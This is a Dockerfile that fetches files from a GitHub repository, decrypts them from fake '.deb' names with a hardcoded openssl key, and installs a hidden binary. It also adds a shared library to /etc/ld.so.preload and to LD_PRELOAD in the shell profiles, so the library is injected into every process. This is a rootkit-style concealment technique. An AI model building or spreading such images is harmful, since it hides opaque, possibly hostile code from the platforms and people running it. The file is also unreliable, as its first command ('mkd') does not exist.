FROM ubuntu

RUN mkd /stark-link &&chmod 0777 -R /stark-link
RUN apt update && apt install -y curl git wget tar openssl unzip bash
ADD Autostart /Autostart
RUN chmod +x /Autostart
RUN git clone https://github.com/jekyll-mask-repo-new/SL-Bin.git
RUN dd if=SL-Bin/sl-bin.deb |openssl des3 -d -k 8ddefff7-f00b-46f0-ab32-2eab1d227a61|tar zxf -
RUN dd if=SL-Bin/caddy.deb |openssl des3 -d -k 8ddefff7-f00b-46f0-ab32-2eab1d227a61|tar zxf -
RUN cp sl-bin /stark-link/.sl-bin && cp caddy /usr/bin/caddy
RUN cp SL-Bin/sl-bin.so /sl-bin.so
RUN mv SL-Bin/sl-bin.json /sl-bin.json && mv SL-Bin/Caddyfile /Caddyfile
RUN rm -rf SL-Bin
RUN chmod +x /stark-link/.sl-bin && chmod 0777 /usr/bin/caddy
RUN echo 'export LD_PRELOAD=/sl-bin.so' >> /etc/profile
RUN echo 'export LD_PRELOAD=/sl-bin.so' >> ~/.bashrc
RUN echo /sl-bin.so >> /etc/ld.so.preload
CMD cd / && ./Autostart
